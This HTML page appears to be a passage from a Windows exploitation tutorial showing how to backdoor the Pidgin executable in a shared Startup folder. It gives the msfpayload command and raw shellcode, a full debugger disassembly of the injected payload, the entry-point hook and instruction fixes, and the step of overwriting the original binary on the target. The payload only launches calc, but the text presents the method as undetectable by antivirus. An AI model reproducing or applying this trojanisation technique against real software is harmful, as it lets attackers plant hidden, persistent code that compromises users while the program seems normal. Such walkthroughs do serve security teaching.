<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example Auto Start Pidgin</title>
</head><body># The starup folder for all users contains a shortcut to Pidgin.<br/>
C:\&gt; dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"<br/>
<br/>
&nbsp;Volume in drive C has no label.<br/>
&nbsp;Volume Serial Number is CA24-B8EA<br/>
<br/>
&nbsp;Directory of C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br/>
<br/>
11/23/2014 &nbsp;01:09 AM &nbsp; &nbsp;&lt;DIR&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.<br/>
11/23/2014 &nbsp;01:09 AM &nbsp; &nbsp;&lt;DIR&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;..<br/>
11/23/2014 &nbsp;01:09 AM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1,328 pidgin.exe.lnk<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1 File(s) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1,328 bytes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2 Dir(s) &nbsp;55,254,183,936 bytes free<br/>
<br/>
We could replace this binary with a backdoor, that way each time the system boots our malicious code would be run. However, doing so would be painfully obvious, Pidgin would not start and a closer investigation would immediately reveal our deception.<br/>
<br/>
Instead, we will <br/>
(1) download the executable to our attacking machine, <br/>
(2) inject our malicious code into the binary, <br/>
(3) make sure it still works as intended and <br/>
(4) replace it on the target machine. <br/>
<br/>
The resulting executable will be fully undetectable by AV and will not raise any undue suspicions as pidgin will still function normally. The necessary modification can be made using Immunity debugger (or Olly).<br/>
<br/>
First we will need to take note of pidgin's module entry point. The instructions there are the first thing the program will execute when it is launched.<br/>
<br/>
First we will need to take note of pidgin's module entry point. The instructions there are the first thing the program will execute when it is launched.<br/>
<br/>
<img src="image.png" /><br/>
<br/>
Next we need to find some empty space, large enough to store our shellcode. If you have ever taken a close look at PE executables you will know that there is a huge null-bytes padding at the end of each section (.text, .data, .rdata,..). In this case we can simply scroll down to the end of the ".text" section, the padding there will be a perfect location for our shellcode.<br/>
<br/>
The basic principle is pretty straight forward: <br/>
(1) we need to modify the entry point to jump to the null-byte padding, <br/>
(2) at the jump destination we inject our shellcode, <br/>
(3) we fix any instructions we nuked at the entry point and hand the program control back over to the legitimate code.<br/>
<br/>
First lets modify the entry point to jump to our null-byte padding. If you compare the new entry point with the old one you will notice that several instructions have been messed up. We will see how to correct those later.<br/>
<br/>
<img src="image 2.png" /><br/>
<br/>
Next we need to generate some shellcode which we can copy into the executable as our payload. As an aside, encoding the shellcode is not necessary, in fact doing so may cause issues when the decoder stub tries to unpack it.<br/>
<br/>
# grep &amp; tr to strip out all unnecessary data.<br/>
root@Josjikawa:~# msfpayload windows/exec cmd='calc' exitfunc='none' C |grep '"' |tr -d '"\\x;\n'<br/>
<br/>
fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b42<br/>
3c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b<br/>
582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6a018d85b90000005068318b6f87ff<br/>
d5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c6300<br/>
<br/>
This shellcode will require some minor modifications to run correctly. When the shellcode gets executed the epilogue will end up calling "ntdll.KiFastSystemCallRet" which will in turn terminate execution flow. Since we want to preserve the original program flow we will need to stop this from happening. The resulting shellcode in the debugger can be seen below.<br/>
<br/>
0040391C &nbsp; &nbsp; 60 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSHAD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Save registry and flag values!<br/>
0040391D &nbsp; &nbsp; 9C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSHFD<br/>
0040391E &nbsp; &nbsp; FC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;CLD<br/>
0040391F &nbsp; &nbsp; E8 89000000 &nbsp; &nbsp;CALL pidgin.004039AD<br/>
00403924 &nbsp; &nbsp; 60 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSHAD<br/>
00403925 &nbsp; &nbsp; 89E5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;MOV EBP,ESP<br/>
00403927 &nbsp; &nbsp; 31D2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;XOR EDX,EDX<br/>
00403929 &nbsp; &nbsp; 64:8B52 30 &nbsp; &nbsp; MOV EDX,DWORD PTR FS:[EDX+30]<br/>
0040392D &nbsp; &nbsp; 8B52 0C &nbsp; &nbsp; &nbsp; &nbsp;MOV EDX,DWORD PTR DS:[EDX+C]<br/>
00403930 &nbsp; &nbsp; 8B52 14 &nbsp; &nbsp; &nbsp; &nbsp;&#09;MOV EDX,DWORD PTR DS:[EDX+14]<br/>
00403933 &nbsp; &nbsp; 8B72 28 &nbsp; &nbsp; &nbsp; &nbsp;&#09;MOV ESI,DWORD PTR DS:[EDX+28]<br/>
00403936 &nbsp; &nbsp; 0FB74A 26 &nbsp; &nbsp; &nbsp;MOVZX ECX,WORD PTR DS:[EDX+26]<br/>
0040393A &nbsp; &nbsp; 31FF &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;XOR EDI,EDI<ul><li style="list-style-type: none">0040393C &nbsp; &nbsp; 31C0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; XOR EAX,EAX</li>
</ul>
0040393E &nbsp; &nbsp; AC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;LODS BYTE PTR DS:[ESI]<br/>
0040393F &nbsp; &nbsp; 3C 61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;CMP AL,61<br/>
00403941 &nbsp; &nbsp; 7C 02 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JL SHORT pidgin.00403945<br/>
00403943 &nbsp; &nbsp; 2C 20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;SUB AL,20<br/>
00403945 &nbsp; &nbsp; C1CF 0D &nbsp; &nbsp; &nbsp; &nbsp;ROR EDI,0D<br/>
00403948 &nbsp; &nbsp; 01C7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EDI,EAX<br/>
0040394A &nbsp; &nbsp;^E2 F0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;LOOPD SHORT pidgin.0040393C<br/>
0040394C &nbsp; &nbsp; 52 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH EDX<br/>
0040394D &nbsp; &nbsp; 57 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH EDI<br/>
0040394E &nbsp; &nbsp; 8B52 10 &nbsp; &nbsp; &nbsp; &nbsp;MOV EDX,DWORD PTR DS:[EDX+10]<br/>
00403951 &nbsp; &nbsp; 8B42 3C &nbsp; &nbsp; &nbsp; &nbsp;MOV EAX,DWORD PTR DS:[EDX+3C]<br/>
00403954 &nbsp; &nbsp; 01D0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EAX,EDX<br/>
00403956 &nbsp; &nbsp; 8B40 78 &nbsp; &nbsp; &nbsp; &nbsp;MOV EAX,DWORD PTR DS:[EAX+78]<br/>
00403959 &nbsp; &nbsp; 85C0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;TEST EAX,EAX<br/>
0040395B &nbsp; &nbsp; 74 4A &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JE SHORT pidgin.004039A7<br/>
0040395D &nbsp; &nbsp; 01D0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EAX,EDX<br/>
0040395F &nbsp; &nbsp; 50 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH EAX<br/>
00403960 &nbsp; &nbsp; 8B48 18 &nbsp; &nbsp; &nbsp; &nbsp;&#09;MOV ECX,DWORD PTR DS:[EAX+18]<br/>
00403963 &nbsp; &nbsp; 8B58 20 &nbsp; &nbsp; &nbsp; &nbsp;&#09;MOV EBX,DWORD PTR DS:[EAX+20]<br/>
00403966 &nbsp; &nbsp; 01D3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EBX,EDX<br/>
00403968 &nbsp; &nbsp; E3 3C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JECXZ SHORT pidgin.004039A6<br/>
0040396A &nbsp; &nbsp; 49 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;DEC ECX<br/>
0040396B &nbsp; &nbsp; 8B348B &nbsp; &nbsp; &nbsp; &nbsp; MOV ESI,DWORD PTR DS:[EBX+ECX*4]<br/>
0040396E &nbsp; &nbsp; 01D6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD ESI,EDX<br/>
00403970 &nbsp; &nbsp; 31FF &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;XOR EDI,EDI<br/>
00403972 &nbsp; &nbsp; 31C0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;XOR EAX,EAX<br/>
00403974 &nbsp; &nbsp; AC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;LODS BYTE PTR DS:[ESI]<br/>
00403975 &nbsp; &nbsp; C1CF 0D &nbsp; &nbsp; &nbsp; &nbsp;ROR EDI,0D<br/>
00403978 &nbsp; &nbsp; 01C7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EDI,EAX<br/>
0040397A &nbsp; &nbsp; 38E0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;CMP AL,AH<br/>
0040397C &nbsp; &nbsp;^75 F4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JNZ SHORT pidgin.00403972<br/>
0040397E &nbsp; &nbsp; 037D F8 &nbsp; &nbsp; &nbsp; &nbsp;ADD EDI,DWORD PTR SS:[EBP-8]<br/>
00403981 &nbsp; &nbsp; 3B7D 24 &nbsp; &nbsp; &nbsp; &nbsp;CMP EDI,DWORD PTR SS:[EBP+24]<br/>
00403984 &nbsp; &nbsp;^75 E2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JNZ SHORT pidgin.00403968<br/>
00403986 &nbsp; &nbsp; 58 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EAX<br/>
00403987 &nbsp; &nbsp; 8B58 24 &nbsp; &nbsp; &nbsp; &nbsp;&#09;MOV EBX,DWORD PTR DS:[EAX+24]<br/>
0040398A &nbsp; &nbsp; 01D3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EBX,EDX<br/>
0040398C &nbsp; &nbsp; 66:8B0C4B &nbsp; &nbsp; &nbsp;MOV CX,WORD PTR DS:[EBX+ECX*2]<br/>
00403990 &nbsp; &nbsp; 8B58 1C &nbsp; &nbsp; &nbsp; &nbsp;MOV EBX,DWORD PTR DS:[EAX+1C]<br/>
00403993 &nbsp; &nbsp; 01D3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EBX,EDX<br/>
00403995 &nbsp; &nbsp; 8B048B &nbsp; &nbsp; &nbsp; &nbsp; MOV EAX,DWORD PTR DS:[EBX+ECX*4]<br/>
00403998 &nbsp; &nbsp; 01D0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ADD EAX,EDX<br/>
0040399A &nbsp; &nbsp; 894424 24 &nbsp; &nbsp; &nbsp;MOV DWORD PTR SS:[ESP+24],EAX<br/>
0040399E &nbsp; &nbsp; 5B &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EBX<br/>
0040399F &nbsp; &nbsp; 5B &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EBX<br/>
004039A0 &nbsp; &nbsp; 61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POPAD<br/>
004039A1 &nbsp; &nbsp; 59 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP ECX<br/>
004039A2 &nbsp; &nbsp; 5A &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EDX<br/>
004039A3 &nbsp; &nbsp; 51 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH ECX<br/>
004039A4 &nbsp; &nbsp; FFE0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;JMP EAX<br/>
004039A6 &nbsp; &nbsp; 58 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EAX<br/>
004039A7 &nbsp; &nbsp; 5F &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EDI<br/>
004039A8 &nbsp; &nbsp; 5A &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EDX<br/>
004039A9 &nbsp; &nbsp; 8B12 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;MOV EDX,DWORD PTR DS:[EDX]<br/>
004039AB &nbsp; &nbsp;^EB 86 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;JMP SHORT pidgin.00403933<br/>
004039AD &nbsp; &nbsp; 5D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POP EBP<br/>
004039AE &nbsp; &nbsp; 6A 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;PUSH 1<br/>
004039B0 &nbsp; &nbsp; 8D85 B9000000 &nbsp;LEA EAX,DWORD PTR SS:[EBP+B9]<br/>
004039B6 &nbsp; &nbsp; 50 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH EAX<br/>
004039B7 &nbsp; &nbsp; 68 318B6F87 &nbsp; &nbsp;PUSH 876F8B31<br/>
004039BC &nbsp; &nbsp; FFD5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;CALL EBP<br/>
004039BE &nbsp; &nbsp; EB 22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;JMP SHORT pidgin.004039E2 &nbsp; ---| &nbsp;Hook the shellcode epilog before it ends up<br/>
004039C0 &nbsp; &nbsp; 90 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;NOP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;&#09;| &nbsp; calling ntdll.KiFastSystemCallRet<br/>
004039C1 &nbsp; &nbsp; 90 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;NOP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;&#09;|<br/>
004039C2 &nbsp; &nbsp; 90 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;NOP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;&#09;|<br/>
004039C3 &nbsp; &nbsp; 68 A695BD9D &nbsp; &nbsp;PUSH 9DBD95A6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
004039C8 &nbsp; &nbsp; FFD5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;CALL EBP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;|<br/>
004039CA &nbsp; &nbsp; 3C 06 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;CMP AL,6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;|<br/>
004039CC &nbsp; &nbsp; 7C 0A &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;JL SHORT pidgin.004039D8 &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
004039CE &nbsp; &nbsp; 80FB E0 &nbsp; &nbsp; &nbsp; &nbsp;CMP BL,0E0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;|<br/>
004039D1 &nbsp; &nbsp; 75 05 &nbsp; &nbsp; &nbsp; &nbsp; &#09; JNZ SHORT pidgin.004039D8 &nbsp; &nbsp; |<br/>
004039D3 &nbsp; &nbsp; BB 4713726F &nbsp; &nbsp;MOV EBX,6F721347 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
004039D8 &nbsp; &nbsp; 6A 00 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;PUSH 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;|<br/>
004039DA &nbsp; &nbsp; 53 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;PUSH EBX &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;|<br/>
004039DB &nbsp; &nbsp; FFD5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;CALL EBP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;|<br/>
004039DD &nbsp; &nbsp; 6361 6C &nbsp; &nbsp; &nbsp; &nbsp;ARPL WORD PTR DS:[ECX+6C],SP &nbsp; |<br/>
004039E0 &nbsp; &nbsp; 6300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;ARPL WORD PTR DS:[EAX],AX &nbsp;|<br/>
004039E2 &nbsp; &nbsp; 9D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POPFD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;&lt;----- &nbsp;| &nbsp;Restore registry and flag values! ESP has<br/>
004039E3 &nbsp; &nbsp; 61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POPAD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;not changed, else we would first need to<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;&#09;&#09;&#09;&#09;add a static value to align the stack.<br/>
<br/>
Before we return execution flow to the module entry point we need to fix the instruction we nuked. Let's compare the module entry point before and after our modification.<br/>
<br/>
All that remains is to append the nuked assembly to the end of our shellcode and jump back to the first untouched instruction at the module entry point.<br/>
<br/>
004039E2 &nbsp; &gt; 9D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POPFD<br/>
004039E3 &nbsp; . 61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#09;POPAD<br/>
004039E4 &nbsp; . 83EC 1C &nbsp; &nbsp; &nbsp; &nbsp;SUB ESP,1C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;&#09;&#09;# Instruction restored!<br/>
004039E7 &nbsp; . C70424 0200000&gt;MOV DWORD PTR SS:[ESP],2 &nbsp;&#09;# Instruction restored!<br/>
004039EE &nbsp; .^E9 B7D8FFFF &nbsp; &nbsp;JMP pidgin.004012AA &nbsp; &nbsp; &nbsp; &#09;&#09;# JMP back to module entry point.<br/>
<br/>
We can now upload the file back to the target and overwrite the original executable. Any time Pidgin is launched, calc will also launch. Meanwhile, Pidgin will function normally, none of the original code has been modified!</body></html>